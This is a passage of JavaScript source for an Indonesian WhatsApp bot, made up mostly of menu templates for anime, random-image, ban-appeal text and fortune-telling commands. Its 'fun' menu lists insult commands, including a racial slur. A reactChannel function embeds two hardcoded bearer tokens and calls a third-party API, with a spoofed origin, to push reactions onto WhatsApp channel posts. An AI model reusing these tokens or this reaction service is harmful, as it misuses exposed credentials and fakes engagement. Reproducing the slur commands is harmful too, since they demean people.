ʙᴏᴛ ɪɴɪ ᴅᴀᴘᴀᴛ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʙᴇʀʙᴀɢᴀɪ ᴍᴀᴄᴀᴍ, ʙᴏᴛ ɪɴɪ ᴄᴏᴄᴏᴋ ᴜɴᴛᴜᴋ ᴊᴀɢᴀ ɢʀᴜᴘ. ᴋᴀᴍᴜ ʙɪsᴀ ɢᴜɴᴀᴋᴀɴ ʙᴏᴛ ɪɴɪ ᴜɴᴛᴜᴋ ᴜɴᴅᴜʜ ᴍᴇᴅɪᴀ,ᴇᴅᴜᴋᴀsɪ, ʙᴇʟᴀᴊᴀʀ ᴅᴀɴ ʟᴀɪɴɴʏᴀ, ʏᴀɴɢ ᴅᴀᴘᴀᴛ ᴍᴇᴍʙᴜᴀᴛ ʟᴇʙɪʜ ᴍᴜᴅᴀʜ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀʟᴀɴᴋᴀɴ sᴇʜᴀʀɪ ʜᴀʀɪ

✘ ᴄʀᴇᴀᴛᴏʀ: ${namaOwner}

ᴊɪᴋᴀ ᴀᴅᴀ ᴍᴀsᴀʟᴀʜ ᴅᴀʟᴀᴍ ᴘᴇɴɢɢᴜɴᴀᴀɴ sɪʟᴀʜᴋᴀɴ ʜᴜʙᴜɴɢɪ ᴄʀᴇᴀᴛᴏʀ ᴜɴᴛᴜᴋ ᴍᴇɴᴀɴʏᴀᴋᴀɴ *.ᴏᴡɴᴇʀ*

${ki}[ Bot Information ]${ki}
┌  ◦ ɴᴀᴍᴇ ʙᴏᴛ : ${global.botname}
│  ◦ ᴠᴇʀsɪᴏɴ : ${global.version}
│  ◦ ʙᴀɪʟᴇʏs : ${global.baileys}
│  ◦ ᴄʀᴇᴀᴛᴏʀ : ${global.namaOwner}
└  ◦ ғʀᴇғɪx : [ ᴍᴜʟᴛɪᴘʀᴇғɪx ]

${ki}[ User Information ]${ki}
┌  ◦ sᴛᴀᴛᴜs : ${isCreator ? 'ᴏᴡɴᴇʀ' : isUserPremium ? 'ᴘʀᴇᴍɪᴜᴍ' : 'ғʀᴇᴇ'}
│  ◦ ɴᴏᴍᴏʀ :  @${m?.sender.split('@')[0]} 
└  ◦ ɴᴀᴍᴇ : ${m.pushName}

──────────────────
*<> [ ᴀɴɪᴍᴇ - ᴍᴇɴᴜ ] <>*
──────────────────
┃  ❏ ${prefix}ʀᴀɴᴅᴏᴍʙᴀ
┃  ❏ ${prefix}ʀᴀɴᴅᴏᴍ-ᴀɴɪᴍᴇ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴀᴡᴏᴏ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴍᴇɢᴜᴍɪɴ
┃  ❏ ${prefix}ᴀɴɪᴍᴇꜱʜɪɴᴏʙᴜ
┃  ❏ ${prefix}ᴀɴɪᴍᴇʜᴀɴᴅʜᴏʟᴅ
┃  ❏ ${prefix}ᴀɴɪᴍᴇʜɪɢʜꜰɪᴠᴇ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴄʀɪɴɢᴇ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴅᴀɴᴄᴇ
┃  ❏ ${prefix}ᴀɴɪᴍᴇʜᴀᴘᴘʏ
┃  ❏ ${prefix}ᴀɴɪᴍᴇɢʟᴏᴍᴘ
┃  ❏ ${prefix}ᴀɴɪᴍᴇꜱᴍᴜɢ
┃  ❏ ${prefix}ᴀɴɪᴍᴇʙʟᴜꜱʜ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴡᴀᴠᴇ
┃  ❏ ${prefix}ᴀɴɪᴍᴇꜱᴍɪʟᴇ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴘᴏᴋᴇ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴡɪɴᴋ 
┃  ❏ ${prefix}ᴀɴɪᴍᴇʙᴏɴᴋ
┃  ❏ ${prefix}ᴀɴɪᴍᴇʙᴜʟʟʏ
┃  ❏ ${prefix}ᴀɴɪᴍᴇʏᴇᴇᴛ
┃  ❏ ${prefix}ᴀɴɪᴍᴇʙɪᴛᴇ
┃  ❏ ${prefix}ᴀɴɪᴍᴇʟɪᴄᴋ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴋɪʟʟ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴄʀʏ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴡʟᴘ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴋɪꜱꜱ
┃  ❏ ${prefix}ᴀɴɪᴍᴇʜᴜɢ
┃  ❏ ${prefix}ᴄᴏᴜᴘʟᴇᴘᴘ 
┃  ❏ ${prefix}ᴀɴɪᴍᴇɴᴇᴋᴏ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴘᴀᴛ
┃  ❏ ${prefix}ᴀɴɪᴍᴇꜱʟᴀᴘ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴄᴜᴅᴅʟᴇ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴡᴀɪꜰᴜ
┃  ❏ ${prefix}ᴀɴɪᴍᴇɴᴏᴍ
┃  ❏ ${prefix}ᴀɴɪᴍᴇꜰᴏxɢɪʀʟ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴛɪᴄᴋʟᴇ 
┃  ❏ ${prefix}ᴀɴɪᴍᴇɢᴇᴄɢ          
┃  ❏ ${prefix}ᴅᴏɢᴡᴏᴏꜰ           
┃  ❏ ${prefix}8ʙᴀʟʟᴘᴏᴏʟ            
┃  ❏ ${prefix}ɢᴏᴏꜱᴇʙɪʀᴅ 
┃  ❏ ${prefix}ᴀɴɪᴍᴇꜰᴇᴇᴅ            
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴀᴠᴀᴛᴀʀ            
┃  ❏ ${prefix}ʟɪᴢᴀʀᴅᴘɪᴄ            
┃  ❏ ${prefix}ᴄᴀᴛᴍᴇᴏᴡ`
        Putzz.sendMessage(m.chat, {
        text: anime,
        contextInfo: {
            externalAdReply: {
                title: `Mikasa-BOT Made With`,
                body: `Putzzslebew`,
                thumbnailUrl: ppmenu,
                sourceUrl: global.ceha,
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: m })
};
break;
case "mrandom": case "randommenu": case "menurandom": {
let random = `*ʜᴀʟʟᴏ ${m.pushName}.*  ɴᴀᴍᴀ ꜱᴀyᴀ ᴀᴅᴀʟᴀʜ *${botname}*, ʏᴀɴɢ ʙɪsᴀ ᴍᴇᴍʙᴀɴᴛᴜ ᴋᴀᴍᴜ

ʙᴏᴛ ɪɴɪ ᴅᴀᴘᴀᴛ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʙᴇʀʙᴀɢᴀɪ ᴍᴀᴄᴀᴍ, ʙᴏᴛ ɪɴɪ ᴄᴏᴄᴏᴋ ᴜɴᴛᴜᴋ ᴊᴀɢᴀ ɢʀᴜᴘ. ᴋᴀᴍᴜ ʙɪsᴀ ɢᴜɴᴀᴋᴀɴ ʙᴏᴛ ɪɴɪ ᴜɴᴛᴜᴋ ᴜɴᴅᴜʜ ᴍᴇᴅɪᴀ,ᴇᴅᴜᴋᴀsɪ, ʙᴇʟᴀᴊᴀʀ ᴅᴀɴ ʟᴀɪɴɴʏᴀ, ʏᴀɴɢ ᴅᴀᴘᴀᴛ ᴍᴇᴍʙᴜᴀᴛ ʟᴇʙɪʜ ᴍᴜᴅᴀʜ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀʟᴀɴᴋᴀɴ sᴇʜᴀʀɪ ʜᴀʀɪ

✘ ᴄʀᴇᴀᴛᴏʀ: ${namaOwner}

ᴊɪᴋᴀ ᴀᴅᴀ ᴍᴀsᴀʟᴀʜ ᴅᴀʟᴀᴍ ᴘᴇɴɢɢᴜɴᴀᴀɴ sɪʟᴀʜᴋᴀɴ ʜᴜʙᴜɴɢɪ ᴄʀᴇᴀᴛᴏʀ ᴜɴᴛᴜᴋ ᴍᴇɴᴀɴʏᴀᴋᴀɴ *.ᴏᴡɴᴇʀ*

${ki}[ Bot Information ]${ki}
┌  ◦ ɴᴀᴍᴇ ʙᴏᴛ : ${global.botname}
│  ◦ ᴠᴇʀsɪᴏɴ : ${global.version}
│  ◦ ʙᴀɪʟᴇʏs : ${global.baileys}
│  ◦ ᴄʀᴇᴀᴛᴏʀ : ${global.namaOwner}
└  ◦ ғʀᴇғɪx : [ ᴍᴜʟᴛɪᴘʀᴇғɪx ]

${ki}[ User Information ]${ki}
┌  ◦ sᴛᴀᴛᴜs : ${isCreator ? 'ᴏᴡɴᴇʀ' : isUserPremium ? 'ᴘʀᴇᴍɪᴜᴍ' : 'ғʀᴇᴇ'}
│  ◦ ɴᴏᴍᴏʀ :  @${m?.sender.split('@')[0]} 
└  ◦ ɴᴀᴍᴇ : ${m.pushName}

──────────────────
*<> [ ʀᴀɴᴅᴏᴍ - ᴍᴇɴᴜ ] <>*
──────────────────
┃  ❏ ${prefix}ᴍᴀʟᴀʏ
┃  ❏ ${prefix}ᴋᴏʀᴇᴀɴ
┃  ❏ ${prefix}ɪɴᴅᴏ
┃  ❏ ${prefix}ᴊᴀᴘᴀɴᴇꜱᴇ
┃  ❏ ${prefix}ᴀɴᴛɪᴡᴏʀᴋ
┃  ❏ ${prefix}ʜɪᴊᴀʙ
┃  ❏ ${prefix}ʙʟᴀᴄᴋᴘɪɴᴋ2
┃  ❏ ${prefix}ᴀᴇꜱᴛʜᴇᴛɪᴄ
┃  ❏ ${prefix}ᴠɪᴇᴛɴᴀᴍᴇꜱᴇ
┃  ❏ ${prefix}ᴅᴏɢɢᴏ
┃  ❏ ${prefix}ᴄᴀᴛ
┃  ❏ ${prefix}ᴊᴜꜱᴛɪɴᴀ
┃  ❏ ${prefix}ʀᴀɴᴅᴏᴍɢɪʀʟ
┃  ❏ ${prefix}ʀᴀɴᴅᴏᴍʙᴏʏ
┃  ❏ ${prefix}ᴛʜᴀɪ
┃  ❏ ${prefix}ɴᴏᴛɴᴏᴛ 
┃  ❏ ${prefix}ᴋᴘᴏᴘ
┃  ❏ ${prefix}ᴋᴀʏᴇꜱ
┃  ❏ ${prefix}ᴄᴏꜱᴘʟᴀʏ
┃  ❏ ${prefix}ʙɪᴋᴇ
┃  ❏ ${prefix}ʙᴏɴᴇᴋᴀ`
        Putzz.sendMessage(m.chat, {
        text: random,
        contextInfo: {
            externalAdReply: {
                title: `Mikasa-BOT Made With`,
                body: `Putzzslebew`,
                thumbnailUrl: ppmenu,
                sourceUrl: global.ceha,
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: m })
};
break;
case "munban": case "unbanmenu": case "menuunban": {
let ban = `*ʜᴀʟʟᴏ ${m.pushName}.*  ɴᴀᴍᴀ ꜱᴀyᴀ ᴀᴅᴀʟᴀʜ *${botname}*, ʏᴀɴɢ ʙɪsᴀ ᴍᴇᴍʙᴀɴᴛᴜ ᴋᴀᴍᴜ

ʙᴏᴛ ɪɴɪ ᴅᴀᴘᴀᴛ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʙᴇʀʙᴀɢᴀɪ ᴍᴀᴄᴀᴍ, ʙᴏᴛ ɪɴɪ ᴄᴏᴄᴏᴋ ᴜɴᴛᴜᴋ ᴊᴀɢᴀ ɢʀᴜᴘ. ᴋᴀᴍᴜ ʙɪsᴀ ɢᴜɴᴀᴋᴀɴ ʙᴏᴛ ɪɴɪ ᴜɴᴛᴜᴋ ᴜɴᴅᴜʜ ᴍᴇᴅɪᴀ,ᴇᴅᴜᴋᴀsɪ, ʙᴇʟᴀᴊᴀʀ ᴅᴀɴ ʟᴀɪɴɴʏᴀ, ʏᴀɴɢ ᴅᴀᴘᴀᴛ ᴍᴇᴍʙᴜᴀᴛ ʟᴇʙɪʜ ᴍᴜᴅᴀʜ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀʟᴀɴᴋᴀɴ sᴇʜᴀʀɪ ʜᴀʀɪ

✘ ᴄʀᴇᴀᴛᴏʀ: ${namaOwner}

ᴊɪᴋᴀ ᴀᴅᴀ ᴍᴀsᴀʟᴀʜ ᴅᴀʟᴀᴍ ᴘᴇɴɢɢᴜɴᴀᴀɴ sɪʟᴀʜᴋᴀɴ ʜᴜʙᴜɴɢɪ ᴄʀᴇᴀᴛᴏʀ ᴜɴᴛᴜᴋ ᴍᴇɴᴀɴʏᴀᴋᴀɴ *.ᴏᴡɴᴇʀ*

${ki}[ Bot Information ]${ki}
┌  ◦ ɴᴀᴍᴇ ʙᴏᴛ : ${global.botname}
│  ◦ ᴠᴇʀsɪᴏɴ : ${global.version}
│  ◦ ʙᴀɪʟᴇʏs : ${global.baileys}
│  ◦ ᴄʀᴇᴀᴛᴏʀ : ${global.namaOwner}
└  ◦ ғʀᴇғɪx : [ ᴍᴜʟᴛɪᴘʀᴇғɪx ]

${ki}[ User Information ]${ki}
┌  ◦ sᴛᴀᴛᴜs : ${isCreator ? 'ᴏᴡɴᴇʀ' : isUserPremium ? 'ᴘʀᴇᴍɪᴜᴍ' : 'ғʀᴇᴇ'}
│  ◦ ɴᴏᴍᴏʀ :  @${m?.sender.split('@')[0]} 
└  ◦ ɴᴀᴍᴇ : ${m.pushName}

──────────────────
*<> [ ᴛxᴛᴜɴʙᴀɴ - ᴍᴇɴᴜ ] <>*
──────────────────
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ1 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ2 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ3 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ4 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ5 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ6 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ7 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ8 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ9 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ10 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ11 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ12 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ13 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ14 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ15 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ16 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ17 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ18  
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ19 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ20 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ21 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴘʀᴇᴍᴠ1 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴘʀᴇᴍᴠ2 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴘʀᴇᴍᴠ3`
        Putzz.sendMessage(m.chat, {
        text: ban,
        contextInfo: {
            externalAdReply: {
                title: `Mikasa-BOT Made With`,
                body: `Putzzslebew`,
                thumbnailUrl: ppmenu,
                sourceUrl: global.ceha,
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: m })
};
break;

//=========
case "mfun": case "menufun": case "funmenu": {
let fun = `*ʜᴀʟʟᴏ ${m.pushName}.*  ɴᴀᴍᴀ ꜱᴀyᴀ ᴀᴅᴀʟᴀʜ *${botname}*, ʏᴀɴɢ ʙɪsᴀ ᴍᴇᴍʙᴀɴᴛᴜ ᴋᴀᴍᴜ

ʙᴏᴛ ɪɴɪ ᴅᴀᴘᴀᴛ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʙᴇʀʙᴀɢᴀɪ ᴍᴀᴄᴀᴍ, ʙᴏᴛ ɪɴɪ ᴄᴏᴄᴏᴋ ᴜɴᴛᴜᴋ ᴊᴀɢᴀ ɢʀᴜᴘ. ᴋᴀᴍᴜ ʙɪsᴀ ɢᴜɴᴀᴋᴀɴ ʙᴏᴛ ɪɴɪ ᴜɴᴛᴜᴋ ᴜɴᴅᴜʜ ᴍᴇᴅɪᴀ,ᴇᴅᴜᴋᴀsɪ, ʙᴇʟᴀᴊᴀʀ ᴅᴀɴ ʟᴀɪɴɴʏᴀ, ʏᴀɴɢ ᴅᴀᴘᴀᴛ ᴍᴇᴍʙᴜᴀᴛ ʟᴇʙɪʜ ᴍᴜᴅᴀʜ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀʟᴀɴᴋᴀɴ sᴇʜᴀʀɪ ʜᴀʀɪ

✘ ᴄʀᴇᴀᴛᴏʀ: ${namaOwner}

ᴊɪᴋᴀ ᴀᴅᴀ ᴍᴀsᴀʟᴀʜ ᴅᴀʟᴀᴍ ᴘᴇɴɢɢᴜɴᴀᴀɴ sɪʟᴀʜᴋᴀɴ ʜᴜʙᴜɴɢɪ ᴄʀᴇᴀᴛᴏʀ ᴜɴᴛᴜᴋ ᴍᴇɴᴀɴʏᴀᴋᴀɴ *.ᴏᴡɴᴇʀ*

${ki}[ Bot Information ]${ki}
┌  ◦ ɴᴀᴍᴇ ʙᴏᴛ : ${global.botname}
│  ◦ ᴠᴇʀsɪᴏɴ : ${global.version}
│  ◦ ʙᴀɪʟᴇʏs : ${global.baileys}
│  ◦ ᴄʀᴇᴀᴛᴏʀ : ${global.namaOwner}
└  ◦ ғʀᴇғɪx : [ ᴍᴜʟᴛɪᴘʀᴇғɪx ]

${ki}[ User Information ]${ki}
┌  ◦ sᴛᴀᴛᴜs : ${isCreator ? 'ᴏᴡɴᴇʀ' : isUserPremium ? 'ᴘʀᴇᴍɪᴜᴍ' : 'ғʀᴇᴇ'}
│  ◦ ɴᴏᴍᴏʀ :  @${m?.sender.split('@')[0]} 
└  ◦ ɴᴀᴍᴇ : ${m.pushName}

──────────────────
*<> [ ғᴜɴ - ᴍᴇɴᴜ ] <>*
┏─────────────────
┃  ❏ ${prefix}ᴀᴘᴀᴋᴀʜ 
┃  ❏ ${prefix}ʙᴀɢᴀɪᴍᴀɴᴀᴋᴀʜ  
┃  ❏ ${prefix}ᴋᴀᴘᴀɴᴋᴀʜ 
┃  ❏ ${prefix}ʙɪꜱᴀᴋᴀʜ 
┃  ❏ ${prefix}ꜱᴀɴɢᴇᴄᴇᴋ 
┃  ❏ ${prefix}ᴄᴀɴᴛɪᴋᴄᴇᴋ 
┃  ❏ ${prefix}ɢᴀɴᴛᴇɴɢᴄᴇᴋ 
┃  ❏ ${prefix}ᴊᴏᴍᴏᴋᴄᴇᴋ 
┃  ❏ ${prefix}ᴡᴀɴɢʏ 
┃  ❏ ${prefix}ʀᴀᴛᴇ
┃  ❏ ${prefix}ᴛᴏʟᴏʟ
┃  ❏ ${prefix}ɢᴏʙʟᴏɢ
┃  ❏ ${prefix}ɢᴏʙʟᴏᴋ
┃  ❏ ${prefix}ɪᴅɪᴏᴛ
┃  ❏ ${prefix}ɢᴀʏ
┃  ❏ ${prefix}ᴊᴏᴍᴏᴋ
┃  ❏ ${prefix}ʙᴀᴊɪɴɢᴀɴ
┃  ❏ ${prefix}ᴍᴜɴᴀꜰɪᴋ
┃  ❏ ${prefix}ᴋᴏɴᴛᴏʟ
┃  ❏ ${prefix}ʏᴀᴛɪᴍ
┃  ❏ ${prefix}ᴘᴏᴋᴇ
┃  ❏ ${prefix}ᴘᴇᴍʙᴏᴋᴇᴘ
┃  ❏ ${prefix}ʜɪᴛᴀᴍ
┃  ❏ ${prefix}ᴊᴀᴡᴀ
┃  ❏ ${prefix}ᴡɪʙᴜ
┃  ❏ ${prefix}ꜱᴛʀᴇꜱꜱ
┃  ❏ ${prefix}ᴍɪꜱᴋɪɴ
┃  ❏ ${prefix}ᴄᴀɴᴛɪᴋ
┃  ❏ ${prefix}ᴍᴀɴɪꜱ
┃  ❏ ${prefix}ʙᴀʙɪ
┃  ❏ ${prefix}ɢᴀɴᴛᴇɴɢ
┃  ❏ ${prefix}ᴄɪɴᴀ
┃  ❏ ${prefix}ᴀᴛʜᴇɪꜱ
┃  ❏ ${prefix}ᴘᴀᴘᴜᴀ
┃  ❏ ${prefix}ɴɪɢɢᴀ
┃  ❏ ${prefix}ᴘᴇɴɢᴇɴᴛᴏᴛ
┃  ❏ ${prefix}ꜱᴇᴋꜱɪ
┃  ❏ ${prefix}ᴋᴀᴡᴀɪ
┃  ❏ ${prefix}ᴛᴇʀᴄɪɴᴅᴏ
┃  ❏ ${prefix}ꜰᴇᴍʙᴏᴋᴇꜰ
┃  ❏ ${prefix}ᴘᴇɴɢᴏᴄᴏᴋ
┃  ❏ ${prefix}ᴄᴀʙᴜʟ
┃  ❏ ${prefix}ꜰᴜᴄᴋʙᴏʏ
┃  ❏ ${prefix}ᴘʟᴀʏʙᴏʏ
┃  ❏ ${prefix}ꜱᴀɴɢᴇ
┃  ❏ ${prefix}ꜱᴀɴɢᴇᴀɴ
┃  ❏ ${prefix}ʜᴏᴛ
┃  ❏ ${prefix}ᴀᴘᴀᴋᴀʜ
┃  ❏ ${prefix}ʙᴀɢᴀɪᴍᴀɴᴀ
┃  ❏ ${prefix}ʙɪsᴀᴋᴀʜ
┃  ❏ ${prefix}ɢᴀɴᴛᴇɴɢᴄᴇᴋ
┃  ❏ ${prefix}ᴄᴀɴᴛɪᴋᴄᴇᴋ
┃  ❏ ${prefix}ʜɪᴛᴀᴍᴄᴇᴋ
┃  ❏ ${prefix}ᴋᴀᴘᴀɴᴋᴀʜ
┃  ❏ ${prefix}ᴍᴀʀᴀʜɪʀɪᴘᴇʀ
┃  ❏ ${prefix}ᴡᴀɴɢʏ
┃  ❏ ${prefix}sᴀɴɢᴇᴄᴇᴋ
┗═━═━═━═━═━═━═━═━═╴`
        Putzz.sendMessage(m.chat, {
        text: fun,
        contextInfo: {
            externalAdReply: {
                title: `Mikasa-MD Made With`,
                body: `Putzzslebew`,
                thumbnailUrl: ppmenu,
                sourceUrl: global.ceha,
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: qtext })
};
break;
async function reactChannel(link, emojis) {
  const bearers = [
    "Bearer 6ff2b5120dd7bb71f8859eb58495c91911daf16243ce7b6172d1f3b767846ef3",
    "Bearer 51d6f2aa5bbfc776f2b73484de6d22b41fc705668ccd9398b6dd622bccfac950"
  ]
  const idx = Math.floor(Math.random() * bearers.length)
  const tokek = bearers[idx]
  const res = await fetch('https://foreign-marna-sithaunarathnapromax-9a005c2e.koyeb.app/api/channel/react-to-post', {
    method: 'POST',
    headers: {
      'authority': 'foreign-marna-sithaunarathnapromax-9a005c2e.koyeb.app',
      'accept': 'application/json, text/plain, */*',
      'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
      'content-type': 'application/json',
      'authorization': tokek,
      'origin': 'https://asitha.top',
      'referer': 'https://asitha.top/',
      'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'cross-site',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    },
    body: JSON.stringify({
      post_link: link,
      reacts: emojis
    })
  })
  const result = await res.text()
  console.log(`✅ React sukses ke ${link}\n🌟 Emoji: ${emojis}\n📦 Response: ${result}\n🔐 Bearer: dex: ${idx + 1})`)
}
case 'rchh': 
case 'reactchh': {
    if (!text.includes("https://whatsapp.com/channel/"))
        return ReplyLanz(`penggunaa salah!\nContoh: ${prefix + command} https://whatsapp.com/channel/0029Vb7CA97CnA7oqK5CKC0M/101 😵‍💫,🫨,🤫`)
    const lon = text.trim().split(" ")
    const link = lon[0]
    const emojis = lon.slice(1).join(" ")
    if (!link || !emojis)
        return ReplyLanz(`gunakan seperti ini\n${prefix + command} <link_channel> <emoji>`)
    await reactChannel(link, emojis)
    ReplyLanz(
        `✅ *React Berhasil!*\n` +
        `📌 *Link:* ${link}\n` +
        `🌟 *Emoji:* ${emojis}\n` +
        `📣 React ke post berhasil dikirim!`
    )
}
break
case "mprim": case "menuprimbon": case "primbonmenu": {
let primbon = `*ʜᴀʟʟᴏ ${m.pushName}.*  ɴᴀᴍᴀ ꜱᴀyᴀ ᴀᴅᴀʟᴀʜ *${botname}*, ʏᴀɴɢ ʙɪsᴀ ᴍᴇᴍʙᴀɴᴛᴜ ᴋᴀᴍᴜ

ʙᴏᴛ ɪɴɪ ᴅᴀᴘᴀᴛ ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ʙᴇʀʙᴀɢᴀɪ ᴍᴀᴄᴀᴍ, ʙᴏᴛ ɪɴɪ ᴄᴏᴄᴏᴋ ᴜɴᴛᴜᴋ ᴊᴀɢᴀ ɢʀᴜᴘ. ᴋᴀᴍᴜ ʙɪsᴀ ɢᴜɴᴀᴋᴀɴ ʙᴏᴛ ɪɴɪ ᴜɴᴛᴜᴋ ᴜɴᴅᴜʜ ᴍᴇᴅɪᴀ,ᴇᴅᴜᴋᴀsɪ, ʙᴇʟᴀᴊᴀʀ ᴅᴀɴ ʟᴀɪɴɴʏᴀ, ʏᴀɴɢ ᴅᴀᴘᴀᴛ ᴍᴇᴍʙᴜᴀᴛ ʟᴇʙɪʜ ᴍᴜᴅᴀʜ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀʟᴀɴᴋᴀɴ sᴇʜᴀʀɪ ʜᴀʀɪ

✘ ᴄʀᴇᴀᴛᴏʀ: ${namaOwner}

ᴊɪᴋᴀ ᴀᴅᴀ ᴍᴀsᴀʟᴀʜ ᴅᴀʟᴀᴍ ᴘᴇɴɢɢᴜɴᴀᴀɴ sɪʟᴀʜᴋᴀɴ ʜᴜʙᴜɴɢɪ ᴄʀᴇᴀᴛᴏʀ ᴜɴᴛᴜᴋ ᴍᴇɴᴀɴʏᴀᴋᴀɴ *.ᴏᴡɴᴇʀ*

${ki}[ Bot Information ]${ki}
┌  ◦ ɴᴀᴍᴇ ʙᴏᴛ : ${global.botname}
│  ◦ ᴠᴇʀsɪᴏɴ : ${global.version}
│  ◦ ʙᴀɪʟᴇʏs : ${global.baileys}
│  ◦ ᴄʀᴇᴀᴛᴏʀ : ${global.namaOwner}
└  ◦ ғʀᴇғɪx : [ ᴍᴜʟᴛɪᴘʀᴇғɪx ]

${ki}[ User Information ]${ki}
┌  ◦ sᴛᴀᴛᴜs : ${isCreator ? 'ᴏᴡɴᴇʀ' : isPremium ? 'ᴘʀᴇᴍɪᴜᴍ' : 'ғʀᴇᴇ'}
│  ◦ ɴᴏᴍᴏʀ :  @${m?.sender.split('@')[0]} 
└  ◦ ɴᴀᴍᴇ : ${m.pushName}
${more}
──────────────────
*<> [ ᴘʀɪᴍʙᴏɴ - ᴍᴇɴᴜ ] <>*
┏─────────────────
┃  ❏ ${prefix}ᴀʀᴛɪᴍɪᴍᴘɪ
┃  ❏ ${prefix}ᴀʀᴛɪɴᴀᴍᴀ
┃  ❏ ${prefix}ʀᴀᴍᴀʟᴊᴏᴅᴏʜ
┃  ❏ ${prefix}ʀᴀᴍᴀʟᴊᴏᴅᴏʜʙᴀʟɪ
┃  ❏ ${prefix}ꜱᴜᴀᴍɪɪꜱᴛʀɪ
┃  ❏ ${prefix}ʀᴀᴍᴀʟᴄɪɴᴛᴀ
┃  ❏ ${prefix}ᴄᴏᴄᴏᴋɴᴀᴍᴀ
┃  ❏ ${prefix}ᴘᴀꜱᴀɴɢᴀɴ
┃  ❏ ${prefix}ᴊᴀᴅɪᴀɴɴɪᴋᴀʜ
┃  ❏ ${prefix}ꜱɪꜰᴀᴛᴜꜱᴀʜᴀ
┃  ❏ ${prefix}ʀᴇᴢᴇᴋɪ
┃  ❏ ${prefix}ᴘᴇᴋᴇʀᴊᴀᴀɴ
┃  ❏ ${prefix}ɴᴀꜱɪʙ
┃  ❏ ${prefix}ᴘᴇɴʏᴀᴋɪᴛ
┃  ❏ ${prefix}ᴛᴀʀᴏᴛ
┃  ❏ ${prefix}ꜰᴇɴɢꜱʜᴜɪ
┃  ❏ ${prefix}ʜᴀʀɪʙᴀɪᴋ
┃  ❏ ${prefix}ʜᴀʀɪꜱᴀɴɢᴀʀ
┃  ❏ ${prefix}ʜᴀʀɪꜱɪᴀʟ
┃  ❏ ${prefix}ɴᴀɢᴀʜᴀʀɪ
┃  ❏ ${prefix}ᴀʀᴀʜʀᴇᴢᴇᴋɪ
┃  ❏ ${prefix}ᴘᴇʀᴜɴᴛᴜɴɢᴀɴ
┃  ❏ ${prefix}ᴡᴇᴛᴏɴ
┃  ❏ ${prefix}ᴋᴀʀᴀᴋᴛᴇʀ
┃  ❏ ${prefix}ᴋᴇʙᴇʀᴜɴᴛᴜɴɢᴀɴ
┃  ❏ ${prefix}ᴍᴇᴍᴀɴᴄɪɴɢ
┃  ❏ ${prefix}ᴍᴀꜱᴀꜱᴜʙᴜʀ
